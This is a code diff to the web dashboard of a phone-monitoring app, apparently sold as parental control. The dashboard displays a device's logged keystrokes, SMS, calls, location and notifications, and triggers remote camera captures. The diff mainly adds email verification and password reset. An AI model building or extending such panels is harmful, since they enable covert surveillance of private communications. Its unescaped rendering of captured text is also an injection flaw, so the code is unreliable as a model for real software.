@@ -243,7 +243,7 @@
              border-radius: 10px; border: none; cursor: pointer; color: white; font-weight: 600;
         }
         #submit-auth-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 169, 165, 0.3); }
-        #error-message { color: var(--accent-pink); margin-top: 1rem; font-weight: 500; min-height: 20px; }
+        #error-message { color: var(--accent-red); margin-top: 1rem; font-weight: 500; min-height: 20px; }
         
         .modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -481,7 +481,7 @@
     </div>
     
     <div id="offline-banner">No Internet Connection. Please check your network.</div>
-    <div id="toast-notification"></div>
+    <!-- The old toast notification is removed -->
 
     <div id="auth-container">
         <div class="auth-card">
@@ -492,6 +492,7 @@
             </div>
             <input type="email" id="email" placeholder="Email">
             <input type="password" id="password" placeholder="Password">
+            <a href="#" id="forgot-password-link" style="display: block; text-align: right; color: var(--accent-blue); text-decoration: none; margin-bottom: 1rem;">Forgot Password?</a>
             <button id="submit-auth-btn">
                 <span id="submit-auth-btn-text">Login</span>
             </button>
@@ -499,7 +500,7 @@
         </div>
     </div>
 
-    <div id="dashboard" class="dashboard-container">
+    <div id="dashboard" class="dashboard-container" style="display: none;">
         <div id="overlay"></div>
         <aside class="sidebar">
             <div>
@@ -617,16 +618,16 @@
     <div id="signup-success-modal" class="modal-overlay">
         <div class="modal-content">
             <div class="modal-header">
-                <h3>Account Created Successfully!</h3>
+                <h3>Account Created! Please Verify Your Email.</h3>
             </div>
             <div class="modal-body">
                 <p style="margin-bottom: 1rem; line-height: 1.6;">
-                    <b>Next Step:</b> Install the application on your child's mobile device.
+                    We have sent a verification link to your email address.
                 </p>
                 <p style="margin-bottom: 1.5rem; line-height: 1.6;">
-                    When you open the app on your child's phone, please use the same Email and Password that you just used to sign up here.
+                    Please click the link in that email to finish signing up. After verification, you can log in.
                 </p>
-                <button id="home-redirect-btn" class="home-btn">Go to Home</button>
+                <button class="ok-btn">Okay</button>
             </div>
         </div>
     </div>
@@ -659,6 +660,19 @@
             </div>
         </div>
     </div>
+
+    <!-- New Modal for General Notifications -->
+    <div id="info-notification-modal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 500px;">
+            <div class="modal-header">
+                <h3 id="info-modal-title">Notification</h3>
+            </div>
+            <div class="modal-body">
+                <p id="info-modal-text" style="font-size: 1.1rem; line-height: 1.6; text-align: center;"></p>
+                <button class="ok-btn">Okay</button>
+            </div>
+        </div>
+    </div>
     
     <footer class="page-footer">
         © Copyright FamToolApp. All Rights Reserved by FamToolApp
@@ -666,9 +680,8 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
-        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
+        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut, sendPasswordResetEmail, sendEmailVerification } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
         import { getDatabase, ref, onValue, remove, update, query, orderByChild, equalTo, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
-        // Storage is no longer used for displaying photos.
         import { getStorage } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
 
         const firebaseConfig = {
@@ -707,10 +720,9 @@
         const submitAuthBtn = document.getElementById('submit-auth-btn');
         const submitAuthBtnText = document.getElementById('submit-auth-btn-text');
         const signupSuccessModal = document.getElementById('signup-success-modal');
-        const homeRedirectBtn = document.getElementById('home-redirect-btn');
+        const forgotPasswordLink = document.getElementById('forgot-password-link');
         const comingSoonModal = document.getElementById('coming-soon-modal');
         const comingSoonTitle = document.getElementById('coming-soon-title');
-        const toastNotification = document.getElementById('toast-notification');
         const offlineBanner = document.getElementById('offline-banner');
         const adminNotificationModal = document.getElementById('admin-notification-modal');
         const adminNotificationText = document.getElementById('admin-notification-text');
@@ -718,6 +730,9 @@
         const liveChatBtn = document.getElementById('live-chat-btn');
         const chatModal = document.getElementById('chat-modal');
         const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');
+        
+        const infoNotificationModal = document.getElementById('info-notification-modal');
+        const infoModalText = document.getElementById('info-modal-text');
 
         let authMode = 'login';
         let activeDataListener = null;
@@ -732,33 +747,118 @@
         let isKeyloggerLoading = false;
         
         toggleSidebarBtn.addEventListener('click', () => dashboard.classList.toggle('sidebar-hidden'));
-        loginTabBtn.addEventListener('click', () => { authMode = 'login'; loginTabBtn.classList.add('active'); signupTabBtn.classList.remove('active'); submitAuthBtnText.textContent = 'Login'; errorMessage.textContent = ''; });
-        signupTabBtn.addEventListener('click', () => { authMode = 'signup'; signupTabBtn.classList.add('active'); loginTabBtn.classList.remove('active'); submitAuthBtnText.textContent = 'Sign Up'; errorMessage.textContent = ''; });
+        
+        loginTabBtn.addEventListener('click', () => { 
+            authMode = 'login'; 
+            loginTabBtn.classList.add('active'); 
+            signupTabBtn.classList.remove('active'); 
+            submitAuthBtnText.textContent = 'Login'; 
+            errorMessage.textContent = ''; 
+            forgotPasswordLink.style.display = 'block'; 
+        });
+        signupTabBtn.addEventListener('click', () => { 
+            authMode = 'signup'; 
+            signupTabBtn.classList.add('active'); 
+            loginTabBtn.classList.remove('active'); 
+            submitAuthBtnText.textContent = 'Sign Up'; 
+            errorMessage.textContent = ''; 
+            forgotPasswordLink.style.display = 'none'; 
+        });
         
         submitAuthBtn.addEventListener('click', () => {
             const email = emailInput.value; const password = passwordInput.value; errorMessage.textContent = '';
             if (!email || !password) { errorMessage.textContent = 'Please enter both email and password.'; return; }
+            
             if (authMode === 'login') {
-                signInWithEmailAndPassword(auth, email, password).catch(error => { errorMessage.textContent = getFriendlyAuthError(error.code); });
+                signInWithEmailAndPassword(auth, email, password)
+                  .then((userCredential) => {
+                      const user = userCredential.user;
+                      // ===== START: CODE FIX / कोड में सुधार यहाँ से शुरू =====
+                      
+                      const cutoffDate = new Date('2025-08-20T00:00:00Z'); 
+                      const creationDate = new Date(user.metadata.creationTime);
+
+                     
+                      if (creationDate >= cutoffDate) {
+                          // यह एक नया उपयोगकर्ता है, इसलिए उन्हें सत्यापित होना चाहिए।
+                          if (!user.emailVerified) {
+                              errorMessage.textContent = "Please verify your email to log in. Check your inbox.";
+                          }
+                      } 
+                      // पुराने उपयोगकर्ता (कटऑफ से पहले बनाए गए) सत्यापन स्थिति की परवाह किए बिना लॉग इन कर सकते हैं।
+                      // 'else' ब्लॉक की कोई आवश्यकता नहीं है, क्योंकि onAuthStateChanged एक्सेस को संभालेगा।
+                      // ===== END: CODE FIX / कोड में सुधार यहाँ समाप्त =====
+                  })
+                  .catch(error => { 
+                      errorMessage.textContent = getFriendlyAuthError(error.code); 
+                  });
             } else {
-                createUserWithEmailAndPassword(auth, email, password).then(() => { showToast('Sign-up Successful!'); authContainer.style.display = 'none'; openModal(signupSuccessModal); }).catch(error => { errorMessage.textContent = getFriendlyAuthError(error.code); });
+                createUserWithEmailAndPassword(auth, email, password)
+                    .then((userCredential) => {
+                        sendEmailVerification(auth.currentUser)
+                            .then(() => {
+                                showToast('Verification email sent! Please check your inbox to activate your account.');
+                                signOut(auth);
+                            });
+                    })
+                    .catch(error => { 
+                        errorMessage.textContent = getFriendlyAuthError(error.code); 
+                    });
             }
         });
 
-        homeRedirectBtn.addEventListener('click', () => { window.location.href = 'https://famtoolapp.com'; });
+        forgotPasswordLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            const email = emailInput.value;
+            if (!email) {
+                errorMessage.textContent = 'Please enter your email address to reset password.';
+                return;
+            }
+            sendPasswordResetEmail(auth, email)
+                .then(() => {
+                    showToast('Password reset email sent! Check your inbox.');
+                    errorMessage.textContent = '';
+                })
+                .catch((error) => {
+                    errorMessage.textContent = getFriendlyAuthError(error.code);
+                });
+        });
+
         document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));
 
+        // ===== START: CODE FIX / कोड में सुधार यहाँ से शुरू =====
         onAuthStateChanged(auth, user => {
             if (user) {
-                if (!signupSuccessModal.classList.contains('visible')) { authContainer.style.display = 'none'; dashboard.style.display = 'flex'; }
-                loadUserDevices(user.uid);
+                // कटऑफ तिथि: 20 अगस्त, 2025।
+                const cutoffDate = new Date('2025-08-20T00:00:00Z');
+                const creationDate = new Date(user.metadata.creationTime);
+
+                // एक्सेस की अनुमति दें यदि:
+                // 1. उपयोगकर्ता का ईमेल सत्यापित है (यह सभी पर लागू होता है)।
+                // 2. उपयोगकर्ता एक "पुराना" उपयोगकर्ता है (कटऑफ तिथि से पहले बनाया गया), सत्यापन की परवाह किए बिना।
+                if (user.emailVerified || creationDate < cutoffDate) {
+                    authContainer.style.display = 'none'; 
+                    dashboard.style.display = 'flex';
+                    loadUserDevices(user.uid);
+                } else {
+                    // यह मामला नए, असत्यापित उपयोगकर्ताओं पर लागू होता है। उन्हें लॉगइन पेज पर रखा जाएगा।
+                    authContainer.style.display = 'flex'; 
+                    dashboard.style.display = 'none'; 
+                }
             } else {
-                authContainer.style.display = 'flex'; dashboard.style.display = 'none'; userList.innerHTML = ''; detailsView.style.display = 'none'; mainContentTitle.textContent = 'Select a Device'; liveChatBtn.disabled = true;
+                // कोई उपयोगकर्ता साइन इन नहीं है।
+                authContainer.style.display = 'flex'; 
+                dashboard.style.display = 'none'; 
+                userList.innerHTML = ''; 
+                detailsView.style.display = 'none'; 
+                mainContentTitle.textContent = 'Select a Device'; 
+                liveChatBtn.disabled = true;
                 if(activeDataListener) off(activeDataListener.ref);
                 if(activeNotificationListener) off(activeNotificationListener.ref);
                 if(activeChatListener) off(activeChatListener.ref);
             }
         });
+        // ===== END: CODE FIX / कोड में सुधार यहाँ समाप्त =====
 
         function loadUserDevices(userId) {
             const usersRef = ref(db, `user/${userId}`);
@@ -795,13 +895,7 @@
         
         function getSafeCategoryName(category) {
             const nameMap = {
-                'keylogger': 'Keystroke',
-                'location': 'Location',
-                'photo': 'Photos',
-                'sms': 'SMS',
-                'notifications': 'Notifications',
-                'devicestatus': 'Device Status',
-                'calllogs': 'Call Logs'
+                'keylogger': 'Keystroke', 'location': 'Location', 'photo': 'Photos', 'sms': 'SMS', 'notifications': 'Notifications', 'devicestatus': 'Device Status', 'calllogs': 'Call Logs'
             };
             return nameMap[category] || category.charAt(0).toUpperCase() + category.slice(1);
         }
@@ -849,16 +943,11 @@
         }
 
         function renderKeyloggerBatch() {
-            if (isKeyloggerLoading || renderedKeyloggerCount >= fullKeyloggerData.length) {
-                return;
-            }
+            if (isKeyloggerLoading || renderedKeyloggerCount >= fullKeyloggerData.length) return;
             isKeyloggerLoading = true;
             
             const keyloggerList = document.getElementById('keylogger-list');
-            if (!keyloggerList) {
-                isKeyloggerLoading = false;
-                return;
-            }
+            if (!keyloggerList) { isKeyloggerLoading = false; return; }
 
             const end = renderedKeyloggerCount + KEYLOGGER_BATCH_SIZE;
             const batch = fullKeyloggerData.slice(renderedKeyloggerCount, end);
@@ -870,14 +959,7 @@
                     const time = parts[0] || '';
                     const action = (parts[1] || '').replace(/[()]/g, '');
                     const text = parts[2] || '';
-                    contentHTML += `
-                        <div class="data-card">
-                            <div class="data-card-header">
-                                <div class="data-card-title">${action}</div>
-                            </div>
-                            <div class="data-card-body"><strong>${text}</strong></div>
-                            <div class="data-card-footer">${time}</div>
-                        </div>`;
+                    contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-title">${action}</div></div><div class="data-card-body"><strong>${text}</strong></div><div class="data-card-footer">${time}</div></div>`;
                 }
             });
 
@@ -886,15 +968,13 @@
             isKeyloggerLoading = false;
         }
 
-
         function renderDataAsCards(category, data) {
             let contentHTML = '';
             if (!data || Object.keys(data).length === 0) {
-                modalDataDisplayArea.innerHTML = '<p>No data available in this category.</p>';
+                modalDataDisplayArea.innerHTML = '<p>No data available.</p>';
                 return;
             }
             const dataArray = (category !== 'devicestatus' && category !== 'location') ? Object.values(data).reverse() : [];
-
             switch(category) {
                 case 'location':
                     const loc = data; let mapLink = '';
@@ -917,87 +997,23 @@
                         if (call) {
                             let icon, title;
                             switch (String(call.type).toUpperCase()) {
-                                case 'INCOMING':
-                                    icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>`;
-                                    title = `Incoming Call`;
-                                    break;
-                                case 'OUTGOING':
-                                    icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`;
-                                    title = `Outgoing Call`;
-                                    break;
-                                case 'MISSED':
-                                default:
-                                    icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>`;
-                                    title = `Missed Call`;
-                                    break;
+                                case 'INCOMING': icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>`; title = `Incoming Call`; break;
+                                case 'OUTGOING': icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>`; title = `Outgoing Call`; break;
+                                default: icon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>`; title = `Missed Call`; break;
                             }
-                            contentHTML += `
-                                <div class="data-card">
-                                    <div class="data-card-header">
-                                        <div class="data-card-icon">${icon}</div>
-                                        <div class="data-card-title">${title}</div>
-                                    </div>
-                                    <div class="data-card-body">
-                                        <strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br>
-                                        <strong>Duration:</strong> ${call.duration || '0'}s
-                                    </div>
-                                    <div class="data-card-footer">${new Date(call.date).toLocaleString()}</div>
-                                </div>`;
+                            contentHTML += `<div class="data-card"><div class="data-card-header"><div class="data-card-icon">${icon}</div><div class="data-card-title">${title}</div></div><div class="data-card-body"><strong>Number:</strong> ${call.phoneNumber || 'N/A'}<br><strong>Duration:</strong> ${call.duration || '0'}s</div><div class="data-card-footer">${new Date(call.date).toLocaleString()}</div></div>`;
                         }
                     });
                     contentHTML += '</div>';
                     break;
                 case 'devicestatus':
                     const status = data;
-                    contentHTML = `
-                        <div class="data-card">
-                             <div class="data-card-header">
-                                <div class="data-card-icon">
-                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-                                </div>
-                                <div class="data-card-title">Current Device Status</div>
-                            </div>
-                            <div class="data-card-body">
-                                <div class="status-item" style="flex-direction: column; align-items: flex-start; gap: 0.5rem; padding-bottom: 1.5rem;">
-                                    <div style="width:100%; display:flex; justify-content: space-between;">
-                                        <span class="status-item-label">Battery</span>
-                                        <span class="status-item-value">${status.batteryLevel || 'N/A'}%</span>
-                                    </div>
-                                    <div class="battery-level">
-                                        <div class="battery-level-fill" style="width: ${status.batteryLevel || 0}%;"></div>
-                                    </div>
-                                </div>
-                                <div class="status-grid">
-                                    <div class="status-item">
-                                        <span class="status-item-label">Internet</span>
-                                        <span class="status-item-value ${status.internetOn ? 'on' : 'off'}">${status.internetOn ? 'On' : 'Off'}</span>
-                                    </div>
-                                    <div class="status-item">
-                                        <span class="status-item-label">Network Type</span>
-                                        <span class="status-item-value">${status.networkType || 'N/A'}</span>
-                                    </div>
-                                    <div class="status-item">
-                                        <span class="status-item-label">SIM Operator</span>
-                                        <span class="status-item-value">${status.simOperator || 'N/A'}</span>
-                                    </div>
-                                    <div class="status-item">
-                                        <span class="status-item-label">SIM 1</span>
-                                        <span class="status-item-value">${status.sim1Number || 'N/A'}</span>
-                                    </div>
-                                    <div class="status-item">
-                                        <span class="status-item-label">SIM 2</span>
-                                        <span class="status-item-value">${status.sim2Number || 'N/A'}</span>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="data-card-footer">Last updated: ${new Date(status.lastUpdated).toLocaleString() || 'N/A'}</div>
-                        </div>`;
+                    contentHTML = `<div class="data-card"><div class="data-card-header"><div class="data-card-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-teal)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div><div class="data-card-title">Current Device Status</div></div><div class="data-card-body"><div class="status-item" style="flex-direction: column; align-items: flex-start; gap: 0.5rem; padding-bottom: 1.5rem;"><div style="width:100%; display:flex; justify-content: space-between;"><span class="status-item-label">Battery</span><span class="status-item-value">${status.batteryLevel || 'N/A'}%</span></div><div class="battery-level"><div class="battery-level-fill" style="width: ${status.batteryLevel || 0}%;"></div></div></div><div class="status-grid"><div class="status-item"><span class="status-item-label">Internet</span><span class="status-item-value ${status.internetOn ? 'on' : 'off'}">${status.internetOn ? 'On' : 'Off'}</span></div><div class="status-item"><span class="status-item-label">Network Type</span><span class="status-item-value">${status.networkType || 'N/A'}</span></div><div class="status-item"><span class="status-item-label">SIM Operator</span><span class="status-item-value">${status.simOperator || 'N/A'}</span></div><div class="status-item"><span class="status-item-label">SIM 1</span><span class="status-item-value">${status.sim1Number || 'N/A'}</span></div><div class="status-item"><span class="status-item-label">SIM 2</span><span class="status-item-value">${status.sim2Number || 'N/A'}</span></div></div></div><div class="data-card-footer">Last updated: ${new Date(status.lastUpdated).toLocaleString() || 'N/A'}</div></div>`;
                     break;
             }
             modalDataDisplayArea.innerHTML = contentHTML;
         }
 
-        // --- बेहतर और लचीला फंक्शन: डेटाबेस से तस्वीरें दिखाएं ---
         function renderPhotosFromDatabase(userId, childKey) {
             const headerHTML = `<div class="data-header"><button class="capture-photo-btn" data-facing="1"><span>Capture Front Photo</span></button><button class="capture-photo-btn" data-facing="0"><span>Capture Back Photo</span></button><button id="refresh-photos-btn"><span>Refresh</span></button></div>`;
             modalDataDisplayArea.innerHTML = headerHTML + '<div class="loader"></div>';
@@ -1009,16 +1025,12 @@
                     modalDataDisplayArea.innerHTML = headerHTML + '<p>No photos available.</p>';
                     return;
                 }
-
-                // नवीनतम तस्वीरों को पहले दिखाने के लिए ऑब्जेक्ट मानों को उलट दें
                 const photosWithData = Object.values(photos).reverse();
-
                 let photoGridHTML = '<div class="data-grid">';
                 photosWithData.forEach(photoData => {
-                    // सुनिश्चित करें कि photoData एक ऑब्जेक्ट है और इसमें urlPhoto प्रॉपर्टी है
                     if (typeof photoData === 'object' && photoData !== null && photoData.urlPhoto) {
-                        const url = photoData.urlPhoto; // सही प्रॉपर्टी का उपयोग करें
-                        const timeCreated = photoData.dateTime || 'N/A'; // सही प्रॉपर्टी का उपयोग करें
+                        const url = photoData.urlPhoto; 
+                        const timeCreated = photoData.dateTime || 'N/A';
                         photoGridHTML += `<div class="data-card photo-card"><img src="${url}" alt="Captured photo" style="width:100%; height: 200px; object-fit: cover; border-radius: 8px 8px 0 0;" onerror="this.onerror=null;this.src='https://placehold.co/300x200/162136/E0E7FF?text=Error';"><div style="padding: 1rem;"><div class="data-card-footer" style="text-align: left;">${timeCreated}</div><a href="${url}" target="_blank" class="map-link" style="width: 100%; justify-content: center;">View Full Image</a></div></div>`;
                     }
                 });
@@ -1035,14 +1047,7 @@
         
         function getCategoryPath(category) {
             switch (category) {
-                case 'location': return 'location/data';
-                case 'photo': return 'photo/data';
-                case 'keylogger': return 'keyLogger/data';
-                case 'notifications': return 'notificationsMessages/data';
-                case 'sms': return 'sms/data';
-                case 'calllogs': return 'Calls';
-                case 'devicestatus': return 'DeviceStatus';
-                default: return '';
+                case 'location': return 'location/data'; case 'photo': return 'photo/data'; case 'keylogger': return 'keyLogger/data'; case 'notifications': return 'notificationsMessages/data'; case 'sms': return 'sms/data'; case 'calllogs': return 'Calls'; case 'devicestatus': return 'DeviceStatus'; default: return '';
             }
         }
 
@@ -1148,12 +1153,11 @@
                 if (currentNotificationRef) {
                     update(currentNotificationRef, { read: true })
                         .then(() => {
-                            console.log("Notification marked as read and removed from Firebase.");
+                            console.log("Notification marked as read.");
                             closeModal(adminNotificationModal);
                         })
                         .catch((error) => {
                             console.error("Error marking notification as read:", error);
-                            showToast("Error marking notification as read.");
                             closeModal(adminNotificationModal);
                         });
                 } else {
@@ -1168,8 +1172,33 @@
             }
         });
 
-        function getFriendlyAuthError(errorCode) { switch (errorCode) { case 'auth/invalid-email': return 'The email address is not valid. Please try again.'; case 'auth/user-not-found': case 'auth/wrong-password': case 'auth/invalid-credential': return 'Please check your email and password.'; case 'auth/email-already-in-use': return 'This email is already registered. Please use the Login tab.'; case 'auth/weak-password': return 'Your password is too weak. It should be at least 6 characters long.'; default: 'Please check your email and password.'; } }
-        function showToast(message) { toastNotification.textContent = message; toastNotification.classList.add('show'); setTimeout(() => { toastNotification.classList.remove('show'); }, 3000); }
+        // ===== START: CODE FIX / कोड में सुधार यहाँ से शुरू =====
+        // बेहतर त्रुटि संदेशों के लिए अपडेट किया गया फ़ंक्शन
+        function getFriendlyAuthError(errorCode) { 
+            switch (errorCode) { 
+                case 'auth/invalid-email': 
+                    return 'The email address is not valid. Please try again.'; 
+                case 'auth/user-not-found': 
+                case 'auth/wrong-password': 
+                case 'auth/invalid-credential': 
+                    // यहाँ संदेश को बेहतर बनाया गया है ताकि उपयोगकर्ता को स्पष्ट पता चले।
+                    return 'Incorrect email or password. Please check your details and try again.'; 
+                case 'auth/email-already-in-use': 
+                    return 'This email is already registered. Please use the Login tab.'; 
+                case 'auth/weak-password': 
+                    return 'Your password is too weak. It should be at least 6 characters long.'; 
+                default: 
+                    // डिफ़ॉल्ट त्रुटि संदेश को भी अधिक सहायक बनाया गया है।
+                    return 'An authentication error occurred. Please try again later.'; 
+            } 
+        } 
+        // ===== END: CODE FIX / कोड में सुधार यहाँ समाप्त =====
+        
+        function showToast(message) {
+            infoModalText.textContent = message;
+            openModal(infoNotificationModal);
+        }
+
         function updateOnlineStatus() { offlineBanner.style.display = navigator.onLine ? 'none' : 'block'; }
         window.addEventListener('online', updateOnlineStatus);
         window.addEventListener('offline', updateOnlineStatus);
